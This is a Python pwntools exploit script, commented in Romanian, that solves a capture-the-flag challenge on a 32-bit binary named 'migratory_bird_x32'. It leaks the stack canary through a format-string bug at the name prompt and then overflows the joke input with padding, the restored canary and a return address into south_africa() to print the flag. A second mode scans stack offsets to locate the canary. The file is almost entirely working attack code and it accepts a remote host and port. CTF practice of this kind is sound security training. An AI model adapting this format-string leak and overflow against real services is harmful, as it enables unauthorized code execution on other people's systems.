#!/usr/bin/env python3
# ============================================================================
# CTF: migratory_bird_x32 — BOF cu stack canary => leak + ret2win
# Vulnerabilitate: intai format string la "name" (%15$p) scurge canary-ul; apoi
#   overflow la "joke": 32 padding + canary refacut + 12 + ret in south_africa().
# Binar: ELF 32-bit (i386), not stripped | NX OFF · CANARY ON · No-PIE · Partial RELRO
#   - Canary prezent => NU poti face overflow orb; trebuie leak-uit si pus inapoi
#     la locul lui, altfel __stack_chk_fail aborteaza. No-PIE => south_africa fix.
# Moduri:
#   direct (exploit real):    python3 script.py            |  python3 script.py HOST PORT
#   brute (gaseste canary):   python3 script.py brute       |  python3 script.py HOST PORT brute
# ============================================================================
import sys
import re
from pwn import *

context.binary = elf = ELF('./migratory_bird_x32')
context.log_level = 'error'          # scoate zgomotul pwntools

N = 15                               # offsetul canary-ului (confirmat cu 'brute')

def connect():
    if len(sys.argv) >= 3 and sys.argv[2].isdigit():
        return remote(sys.argv[1], sys.argv[2])
    return process('./migratory_bird_x32')

def leak_at(n):
    # o conexiune noua per offset: numele se citeste o singura data pe rulare
    p = connect()
    try:
        p.recvuntil(b"Tell me your name: ")
        p.sendline(b"%%%d$p" % n)          # ex. n=15 -> b"%15$p"
        out = p.recvline().strip()
    except EOFError:
        out = b""
    finally:
        p.close()
    m = re.search(rb"0x([0-9a-fA-F]+)", out)
    return int(m.group(1), 16) if m else None

def looks_like_canary(v):
    # Canary glibc = LSB nul (aliniere) + restul octetilor random. Semnalul cheie:
    # octetii de sus sunt POPULATI (nu e un pointer jos / o valoare cu zerouri sus).
    if v is None or (v & 0xff) != 0:
        return False
    # i386: byte de sus nenul si care nu e prefix tipic de cod/libc/stiva
    return (v >> 24) not in (0x00, 0x08, 0xf6, 0xf7, 0xff)

# --- mod brute: scaneaza offseturile si marcheaza canary-ul -----------------
if 'brute' in sys.argv:
    hexw = 8
    cand = None
    for n in range(1, 41):
        v = leak_at(n)
        if v is None:
            continue
        mark = ""
        if looks_like_canary(v):
            mark = "  <-- posibil CANARY"
            if cand is None:
                cand = n
        print("%%%d$p = 0x%0*x%s" % (n, hexw, v, mark))
    if cand is not None:
        print("\n[+] canary probabil la offsetul %d  (pune N = %d in script)" % (cand, cand))
    else:
        print("\n[-] niciun candidat clar; uita-te la valorile care se termina in 00")
    sys.exit(0)

# --- mod direct: exploit real (leak canary la N + overflow, aceeasi conexiune) ---
p = connect()

south_africa = elf.symbols['south_africa']

p.recvuntil(b"Tell me your name: ")
p.sendline(b"%%%d$p" % N)
canary = int(p.recvline().strip(), 16)
# log.success("canary = %#010x" % canary)

payload  = b"A" * 32
payload += p32(canary)
payload += b"B" * 12
payload += p32(south_africa)

p.recvuntil(b"Now tell me a joke:")
p.sendline(payload)

out = p.recvall(timeout=2)
# cauta un flag care incepe cu CTF, SI sau FLAG; daca nu-l gaseste, arata output-ul brut
flag = re.search(rb"(CTF|SI|FLAG)\{[^}]*\}", out)
print(flag.group().decode() if flag else out)
